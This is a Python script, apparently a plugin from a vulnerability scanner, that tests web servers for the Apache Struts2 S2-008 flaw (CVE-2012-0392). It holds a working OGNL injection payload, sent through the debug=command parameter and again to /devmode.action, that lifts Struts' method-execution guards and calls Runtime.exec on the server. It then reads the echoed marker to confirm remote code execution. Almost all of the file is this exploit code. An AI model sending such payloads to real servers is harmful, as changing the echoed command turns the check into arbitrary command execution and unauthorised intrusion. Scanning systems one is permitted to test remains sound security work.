import requests
from urllib.parse import urlparse
requests.packages.urllib3.disable_warnings()

name = "Apache Struts2 S2-008 'CookieInterceptor'组件权限许可和访问控制漏洞（CVE-2012-0392）"


def run(url):
    headers = {
    'Content-Type':'application/x-www-form-urlencoded',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
    }
    try:
        payload = '''?debug=command&expression=(%23_memberAccess%5B"allowStaticMethodAccess"%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28"false"%29%20%2C%23context%5B"xwork.MethodAccessor.denyMethodExecution"%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20Tre0a498347a5a75a7ue%27%29.getInputStream%28%29%29)'''
        response = requests.get(url+payload, headers=headers, timeout=15, verify=False)
        if 'Tre0a498347a5a75a7ue' in response.text and 'echo' not in response.text:
            return ['True',name,url]
        else:
            host = urlparse(url)
            url = f"{host.scheme}://{host.netloc}"
            try:
                vulurl = url + '/devmode.action'
                payload = '''?debug=command&expression=(%23_memberAccess%5B"allowStaticMethodAccess"%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28"false"%29%20%2C%23context%5B"xwork.MethodAccessor.denyMethodExecution"%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20Tre0a498347a5a75a7ue%27%29.getInputStream%28%29%29)'''
                response = requests.get(vulurl+payload, headers=headers, timeout=15, verify=False)
                if 'Tre0a498347a5a75a7ue' in response.text and 'echo' not in response.text:
                    return ['True',name,vulurl]
                else:
                    return ['False',name]
            except Exception as e:
                return ['False',name]
    except Exception as e:
        return ['False',name]

if __name__ == '__main__':
    url = 'http://192.168.123.46:8080/'
    print(run(url))